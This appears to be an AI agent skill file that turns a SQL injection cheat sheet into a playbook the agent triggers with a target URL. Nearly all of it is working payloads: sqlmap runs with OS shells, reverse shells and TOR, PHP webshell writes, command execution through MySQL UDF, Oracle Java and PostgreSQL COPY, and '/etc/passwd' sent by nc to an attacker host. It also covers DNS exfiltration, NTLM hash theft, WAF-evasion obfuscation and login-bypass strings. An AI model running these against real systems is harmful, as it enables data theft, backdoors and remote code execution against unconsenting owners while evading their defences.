---
name: sqli
description: "SQL Injection testing & exploitation — entry point detection, DBMS fingerprinting (MySQL/Oracle/PostgreSQL/MSSQL/SQLite/Cassandra), SQLmap workflow, auth bypass, union/error/blind/time-based injection, DIOS, file read/write, UDF, out-of-band, WAF bypass, tamper scripts, stacked queries, command execution. Reference: 41-page SQLi cheatsheet (A.T6 M.S666)."
version: 1.0
author: hermes-agent
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [sqli, sqlmap, injection, pentest, web-security, exploitation, waf-bypass]
    category: security
    trigger: "SQLI: <url> or /sqli"
---

# SQL Injection Testing & Exploitation

**Source PDF:** `references/sqli-cheatsheet.pdf` (41 pages, A.T6 M.S666, 2023)

## Scope

Covers every injection technique documented in the reference cheatsheet:
- Entry point detection & DBMS identification
- MySQL injection (Union, Error, Blind, Time-Based, DIOS, File I/O, UDF, Truncation, Out-of-Band)
- Oracle injection (Error, Blind, Time-Based, Java RCE)
- PostgreSQL injection (Error, Blind, Time-Based, Stacked, File I/O, Command Exec via CVE-2019-9193)
- Cassandra injection (Login Bypass)
- MSSQL injection
- SQLite injection
- SQLmap comprehensive workflow (basic → advanced → TOR → proxy → crawl → tamper)
- WAF bypass (whitespace alternatives, comma removal, equal sign bypass, obfuscation)
- Authentication bypass payloads (raw MD5/SHA1, polyglot, routed injection)

---

## 1. Entry Point Detection

### Simple Characters
```
'  %27   "  %22   #  %23   ;  %3B   )   *   &apos;
```

### Multiple Encoding
```
%%2727   %25%27
```

### Merging Characters
```
`+HERP   '||'DERP   '+'herp   ' 'DERP   '%20'HERP   '%2B'HERP
```

### Logic Testing
```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

### Weird Characters (Unicode Transform)
```
U+02BA MODIFIER LETTER DOUBLE PRIME (%CA%BA) → U+0022 QUOTATION MARK (")
U+02B9 MODIFIER LETTER PRIME (%CA%B9) → U+0027 APOSTROPHE (')
```

---

## 2. DBMS Identification

### MySQL Fingerprints
```sql
conv('a',16,2)=conv('a',16,2)
connection_id()=connection_id()
crc32('MySQL')=crc32('MySQL')
```

### MSSQL Fingerprints
```sql
BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
@@CONNECTIONS>0
@@CPU_BUSY=@@CPU_BUSY
USER_ID(1)=USER_ID(1)
```

### Oracle Fingerprints
```sql
ROWNUM=ROWNUM
RAWTOHEX('AB')=RAWTOHEX('AB')
LNNVL(0=123)
```

### PostgreSQL Fingerprints
```sql
5::int=5
5::integer=5
pg_client_encoding()=pg_client_encoding()
get_current_ts_config()=get_current_ts_config()
quote_literal(42.5)=quote_literal(42.5)
current_database()=current_database()
```

### SQLite Fingerprints
```sql
sqlite_version()=sqlite_version()
last_insert_rowid()>1
last_insert_rowid()=last_insert_rowid()
```

### MSAccess Fingerprints
```sql
val(cvar(1))=1
IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0
cdbl(1)=cdbl(1)
```

### Universal Fingerprints
```sql
1337=1337       -- MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL
'i'='i'         -- MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL
```

---

## 3. SQLmap Comprehensive Workflow

### Basic Arguments
```bash
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent \
  --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux \
  --banner --is-dba --users --passwords --current-user --dbs
```

### Load Request File + Mobile User-Agent
```bash
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

### Custom Injection in UserAgent/Header/Referer/Cookie
```bash
python sqlmap.py -u "http://example.com" \
  --data "username=admin&password=pass" \
  --headers="x-forwarded-for:127.0.0.1*"
# Injection point marked with '*'
```

### Second Order Injection
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL \
  --second-order "http://targetapp/wishlist" -v 3

sqlmap -r 1.txt -dbms MySQL -second-order \
  "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

### Shell Techniques
```bash
# SQL Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --sql-shell

# OS Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

# Reverse Shell / Meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn

# SSH Key Drop
python sqlmap.py -u "http://example.com/?id=1" -p id \
  --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
```

### Crawl + Auto-Exploit
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch \
  --forms --threads=5 --level=5 --risk=3
# --batch = non-interactive (accepts defaults)
# --crawl = depth
# --forms = parse and test forms
```

### TOR Integration
```bash
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 \
  --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

### Proxy Integration
```bash
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
```

### Chrome Cookie + Proxy
```bash
sqlmap -u "https://test.com/index.php?id=99" \
  --load-cookie=/media/truecrypt1/TI/cookie.txt \
  --proxy "http://127.0.0.1:8080" -f --time-sec 15 --level 3
```

### Suffix Tamper
```bash
python sqlmap.py -u "http://example.com/?id=1" -p id --suffix="-- "
```

### Direct DB Connection (no URL needed)
```bash
sqlmap.py -d "mysql://user:***@ip/database" --dump-all
```

---

## 4. MySQL Injection

### Testing Injection Points

**String-based:** `SELECT * FROM Table WHERE id = 'FUZZ'`
```
' → False    '' → True    " → False    "" → True    \ → False    \\ → True
```

**Numeric:** `SELECT * FROM Table WHERE id = FUZZ`
```
AND 1 → True    AND 0 → False    AND true → True    AND false → False
1-false → 1 (vulnerable)    1*56 → 56 (vulnerable)    1*56 → 1 (not vulnerable)
```

**Login:** `SELECT * FROM Users WHERE username='FUZZ1' AND password='FUZZ2'`
```
' OR '1    ' OR 1 -- -    " OR "" = "    " OR 1 = 1 -- -
'='    'LIKE'    '=0--+
```

### Union Based — Detect Columns Number

**Method 1: ORDER BY / GROUP BY**
```sql
1' ORDER BY 1--+   # True
1' ORDER BY 2--+   # True
1' ORDER BY 3--+   # True
1' ORDER BY 4--+   # False → 3 columns
# → -1' UNION SELECT 1,2,3--+
```

**Method 2: Error Based (single request)**
```sql
1' ORDER BY 1,2,3,...,100--+
# Unknown column '4' → 3 columns
```

**Method 3: UNION SELECT with @variable**
```sql
1' UNION SELECT @--+     # different columns error
1' UNION SELECT @,@--+   # different columns error
1' UNION SELECT @,@,@--+ # no error → 3 columns
```

**Method 4: LIMIT INTO**
```sql
1' LIMIT 1,1 INTO @--+         # error
1' LIMIT 1,1 INTO @,@--+       # error
1' LIMIT 1,1 INTO @,@,@--+     # no error → 3 columns
```

**Method 5: SELECT * FROM (known table)**
```sql
1' AND (SELECT * FROM Users) = 1--+
# Operand should contain 3 column(s) → 3 columns
```

### Extract Database with information_schema
```sql
UniOn Select 1,2,3,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

### Extract Columns Without information_schema

**MySQL >= 4.1:**
```sql
?id=(1)and(SELECT * from db.users)=(1)
# Operand should contain 4 column(s)
?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
# Column 'id' cannot be null
```

**MySQL 5:**
```sql
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
```

### Extract Data Without Column Name
```sql
select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
```

### Error Based

**Basic (MySQL >= 4.1):**
```sql
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))
x from (select 1 union select 2)a group by x limit 1))+' 
```

**UpdateXML Function:**
```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126))
FROM information_schema.schemata LIMIT data_offset,1)),null)--
' and updatexml(null,concat(0x0a,version()),null)-- -
```

**Extractvalue Function (MySQL >= 5.1):**
```sql
?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126))
FROM information_schema.schemata LIMIT data_offset,1)))--
```

**NAME_CONST (constants only, MySQL >= 5.0):**
```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

### Blind

**Substring equivalent:**
```sql
?id=1 and substring(version(),1,1)=5
?id=1 and right(left(version(),1),1)=5
?id=1 and left(version(),1)=4
?id=1 and ascii(lower(substr(Version(),1,1)))=51
?id=1 and (select mid(version(),1,1)=4)
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

**Blind in ORDER BY using REGEXP:**
```sql
' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items
WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
```

**Blind using conditional statement:**
```sql
# TRUE: version starts with 5 → sleep
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
# FALSE: version starts with 4 → no sleep
2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
```

**Blind with MAKE_SET:**
```sql
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```

**Blind with LIKE (`_` = regex `.`):**
```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
```

### Time Based

**BENCHMARK (MySQL 4/5):**
```sql
+BENCHMARK(40000000,SHA1(1337))+
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

**SLEEP (MySQL 5):**
```sql
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
```

**SLEEP in subselect (character-by-character extraction):**
```sql
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like 'a____')#
1 and (select sleep(10) from dual where database() like 'sa___')#
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where (select table_name from
information_schema.columns where table_schema=database() and
column_name like '%pass%' limit 0,1) like '%')#
```

**Conditional statements:**
```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1,BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

### DIOS (Dump in One Shot)
```sql
-- SecurityIdiots
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)
where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)

-- Profexer
(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)
where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)

-- Dr.Z3r0
(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)
where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))

-- M@dBl00d
(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)
where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),
column_name,0xa3a,2)),@,2))
```

### Current Queries
```sql
union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #
union select 1,(select(@)from(select(@:=0x00),
(select(@)from(information_schema.processlist)where(@)in
(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

### File Read
```sql
-- Requires FILE privileges
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
-- Re-enable LOAD_FILE as root:
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

### File Write (Webshell)
```sql
-- INTO OUTFILE
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php'
  FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6
  into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'

-- INTO DUMPFILE
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL
  INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e
  INTO DUMPFILE '/var/www/html/images/shell.php'
```

### Truncation
```
MySQL treats "admin " and "admin" as identical.
If username column is varchar(20), input "admin a" (21 chars) → truncated to "admin ".
Use to escalate privileges if admin password hash is known.
```

### Fast Exploitation (MySQL >= 5.7.22)
```sql
-- json_arrayagg() > 16,000,000 symbols (vs group_concat 1,024)
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name))
FROM INFORMATION_SCHEMA.TABLES;
```

### UDF Command Execution
```bash
# Check if UDF installed
whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so

# Use sys_exec / sys_eval
mysql -u root -p mysql
SELECT sys_eval('id');
```

### Out of Band
```sql
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt';
```

### DNS Exfiltration
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
```

### UNC Path — NTLM Hash Stealing
```sql
select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\\\error\\abc';
select 'osanda' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
```

---

## 5. Oracle Injection

### Default Databases
| Name | Notes |
|------|-------|
| SYSTEM | All versions |
| SYSAUX | All versions |

### Comments
```
-- -    SQL comment
```

### Version
```sql
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT version FROM v$instance;
```

### Hostname
```sql
SELECT host_name FROM v$instance;                     -- Privileged
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;
```

### Database Name
```sql
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;
```

### Database Credentials
```sql
SELECT username FROM all_users;                   -- All versions
SELECT name, password from sys.user$;              -- Privileged, <= 10g
SELECT name, spare4 from sys.user$;                -- Privileged, <= 11g
```

### List Databases / Columns / Tables
```sql
SELECT DISTINCT owner FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```

### Error Based
```sql
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual
SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual
SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual
```

### Blind
```sql
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)
SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';
SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';
```

### Time Based
```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
```

### Command Execution

**ODAT (Oracle Database Attacking Tool):**
```bash
odat all -s <target-ip> -p 1521
```

**Java Execution (10g R2, 11g R1/R2):**
```sql
-- Grant privileges
exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','writeFileDescriptor', '');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','readFileDescriptor', '');

-- 10g R2, 11g R1/R2
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL

-- 11g R1/R2
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
```

**Java Class Creation (full RCE):**
```sql
BEGIN
EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as
import java.io.*; public class PwnUtil{ public static String runCmd(String args){
try{ BufferedReader myReader = new BufferedReader(new
InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";
while ((stemp = myReader.readLine()) != null) str += stemp + "\n";
myReader.close();return str;} catch (Exception e){ return e.toString();}} ...};';
END;
/
BEGIN
EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2)
return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
END;
/
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

---

## 6. PostgreSQL Injection

### Comments
```
--    /**/    ;    ||
```

### Chain Injection Points
```
/?whatever=1;(select 1 from pg_sleep(5))
/?whatever=1||(select 1 from pg_sleep(5))
```

### Version / User / Databases
```sql
SELECT version()
SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user;
SELECT current_database()
SELECT datname FROM pg_database
```

### List Password Hashes
```sql
SELECT usename, passwd FROM pg_shadow
```

### Check Superuser
```sql
SHOW is_superuser;
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

### List Tables / Columns
```sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
```

### Error Based
```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- 
```

### XML Helpers
```sql
select query_to_xml('select * from pg_user',true,true,'');  -- all results as XML
select database_to_xml(true,true,'');                        -- dump current db
select database_to_xmlschema(true,true,'');                  -- dump as XML schema
```

### Blind
```sql
' and substr(version(),1,10) = 'PostgreSQL' and '1'  -- OK
' and substr(version(),1,10) = 'PostgreXXX' and '1'  -- KO
```

### Time Based
```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))

-- Character-by-character extraction
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1

AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

### Stacked Query
```sql
http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
```

### File Read
```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
SELECT lo_import('/etc/passwd');   -- returns OID
SELECT lo_get(16420);             -- use returned OID
SELECT * from pg_largeobject;     -- dump all large objects
```

### File Write
```sql
CREATE TABLE pentestlab(t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
COPY pentestlab(t) TO '/tmp/pentestlab';
-- Or one line:
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';

SELECT lo_from_bytea(43210, 'your file data');
SELECT lo_put(43210, 20, 'some other data');
SELECT lo_export(43210, '/tmp/testexport');
```

### Command Execution — CVE-2019-9193
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

### Using libc.so.6
```sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
```

### Bypass Filter
```sql
-- Quotes via CHR
SELECT CHR(65)||CHR(66)||CHR(67);

-- Dollar-signs (>= PostgreSQL 8)
SELECT $$This is a string$$
SELECT $TAG$This is another string$TAG$
```

---

## 7. Cassandra Injection

### Login Bypass
```
Username: admin' ALLOW FILTERING; %00     Password: ANY
Username: admin'/*                         Password: */and pass>'
```
Generated query:
```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

---

## 8. Insert Statement — ON DUPLICATE KEY UPDATE

```sql
-- Inject to change admin password:
"attacker_dummy@example.com","bcrypt_hash"),("admin@example.com","bcrypt_hash")
ON DUPLICATE KEY UPDATE password="bcrypt_hash" --
```

Resulting query:
```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com","bcrypt"),
("admin@example.com","bcrypt") ON DUPLICATE KEY UPDATE password="bcrypt" -- ","input");
```

---

## 9. WAF Bypass

### No Space — Whitespace Alternatives
```
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

### No Whitespace — Comments
```
?id=1/*comment*/and/**/1=1/**/--
```

### No Whitespace — Parentheses
```
?id=(1)and(1)=(1)--
```

### Whitespace Alternatives by DBMS

| DBMS | Valid Hex Characters |
|------|---------------------|
| SQLite3 | 0A, 0D, 0C, 09, 20 |
| MySQL 5 | 09, 0A, 0B, 0C, 0D, A0, 20 |
| MySQL 3 | 01-1F, 20, 7F, 80-81, 88, 8D, 8F, 90, 98, 9D, A0 |
| PostgreSQL | 0A, 0D, 0C, 09, 20 |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
| MSSQL | 01-20 (all control chars) |

**Above 0x80 example:**
```
♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
```

### No Comma — OFFSET / FROM / JOIN
```
LIMIT 0,1           → LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1)   → SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4      → UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### No Equal — LIKE / NOT IN / IN / BETWEEN
```
?id=1 and substring(version(),1,1)like(5)
?id=1 and substring(version(),1,1)not in(4,3)
?id=1 and substring(version(),1,1)in(4,3)
?id=1 and substring(version(),1,1) between 3 and 4
```

### Case Modification
```
AND → &&    OR → ||    = → LIKE, REGEXP, BETWEEN, not < and not >
> X → not between 0 and X    WHERE → HAVING
```

### MySQL-Specific Obfuscation
```
1e0UNION SELECT 2
1e1AND-0.0UNION SELECT 2
1/*!12345UNION/*!31337SELECT/*!table_name*/
{ts 1}UNION SELECT.``
information_schema 9.e.table_name
13.37e.table_name
```

### MSSQL-Specific Obfuscation
```
.1UNION SELECT 2
1.UNION SELECT.2alias
1e0UNION SELECT 2
SELECT 0xUNION SELECT 2
\1UNION SELECT 2
```

### Oracle-Specific Obfuscation
```
1FUNION SELECT 2
1DUNION SELECT 2
SELECT 0x7461626c655f6e616d65 FROM all_tab_tables
SELECT CHR(116)|| CHR(97) || CHR(98) FROM all_tab_tables
SELECT%00table_name%00FROM%00all_tab_tables
```

### MySQL-Specific Alternatives
```sql
-- information_schema.tables alternative
select * from mysql.innodb_table_stats;

-- Version alternative
select @@innodb_version;
select @@version;
select version();
```

### Scientific Notation Bypass
```
Blocked: ' or ''='
Working: ' or 1.e('')='

Obfuscated: 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2
```

---

## 10. Authentication Bypass Payloads

### Generic Bypass
```
'-'   ' '   '&'   '^'   '*'   ' or 1=1 limit 1 -- -+
'="or'   ' or ''-'   ' or '' '   ' or ''&'   ' or ''^'   ' or ''*'
'-||0'   "-||0"   "-"   " "   "&"   "^"   "*"
'--'   "--"   ' or 'x'='x   ' or 1=1   admin' --
admin' or '1'='1   admin' or 1=1--   admin' or 1=1#
admin") or ("1"="1   admin") or "1"="1--
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
```

### Raw MD5/SHA1 Bypass
```php
// When raw md5 is used as query string (not hex):
SELECT * FROM admin WHERE pass = '".md5($password,true)."'
// md5("ffifdyop", true) = 'or'6...]...b\0
// sha1("3fDf ", true) = Q...'='...@[...t...- o..._-!
```

### Polyglot Injection
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

/* MySQL only */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))
/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|
"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

### Routed Injection
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

---

## 11. Tamper Scripts (40+ Reference)

| Tamper | Description |
|--------|-------------|
| `0x2char.py` | MySQL 0x encoded → CONCAT(CHAR()) |
| `apostrophemask.py` | Apostrophe → UTF-8 full width |
| `apostrophenullencode.py` | Apostrophe → illegal double unicode |
| `appendnullbyte.py` | Append encoded NULL byte |
| `base64encode.py` | Base64 entire payload |
| `between.py` | `>` → `NOT BETWEEN 0 AND #` |
| `bluecoat.py` | Space → random blank; `=` → `LIKE` |
| `chardoubleencode.py` | Double URL-encode |
| `charencode.py` | URL-encode all chars |
| `charunicodeencode.py` | Unicode-URL-encode |
| `charunicodeescape.py` | Unicode-escape non-encoded chars |
| `commalesslimit.py` | `LIMIT M,N` → `LIMIT N OFFSET M` |
| `commalessmid.py` | `MID(A,B,C)` → `MID(A FROM B FOR C)` |
| `commentbeforeparentheses.py` | `(` → `/**/(` |
| `concat2concatws.py` | `CONCAT(A,B)` → `CONCAT_WS(...)` |
| `equaltolike.py` | `=` → `LIKE` |
| `escapequotes.py` | Slash escape quotes |
| `greatest.py` | `>` → `GREATEST` |
| `halfversionedmorekeywords.py` | Versioned MySQL comment before keywords |
| `htmlencode.py` | HTML encode non-alphanumeric |
| `ifnull2casewhenisnull.py` | `IFNULL(A,B)` → `CASE WHEN ISNULL(A) THEN (B) ELSE (A) END` |
| `ifnull2ifisnull.py` | `IFNULL(A,B)` → `IF(ISNULL(A), B, A)` |
| `informationschemacomment.py` | `/**/` after `information_schema` |
| `least.py` | `>` → `LEAST` |
| `lowercase.py` | All keywords lowercase |
| `modsecurityversioned.py` | Wrap query in versioned comment |
| `modsecurityzeroversioned.py` | Wrap query in zero-versioned comment |
| `multiplespaces.py` | Multiple spaces around keywords |
| `nonrecursivereplacement.py` | Replace filtered keywords |
| `overlongutf8.py` | Overlong UTF-8 encoding |
| `overlongutf8more.py` | Extended overlong UTF-8 |
| `percentage.py` | `%` before each char |
| `plus2concat.py` | `+` → CONCAT() (MSSQL) |
| `plus2fnconcat.py` | `+` → {fn CONCAT()} (MSSQL ODBC) |
| `randomcase.py` | Random case for keywords |
| `randomcomments.py` | Random inline comments |
| `securesphere.py` | Append crafted string |
| `sp_password.py` | Append `sp_password` for log evasion |
| `space2comment.py` | Space → `/**/` |
| `space2dash.py` | Space → `--\n` |
| `space2hash.py` | Space → `#\n` |
| `space2morehash.py` | Space → `#\n` (extended) |
| `space2mssqlblank.py` | MSSQL blank chars |
| `space2mssqlhash.py` | MSSQL space → `#\n` |
| `space2mysqlblank.py` | MySQL blank chars |
| `space2mysqldash.py` | MySQL space → `--\n` |
| `space2plus.py` | Space → `+` |
| `space2randomblank.py` | Random blank chars |
| `symboliclogical.py` | `AND`→`&&`, `OR`→`\|\|` |
| `unionalltounion.py` | `UNION ALL SELECT` → `UNION SELECT` |
| `unmagicquotes.py` | `'` → `%bf%27` + comment |
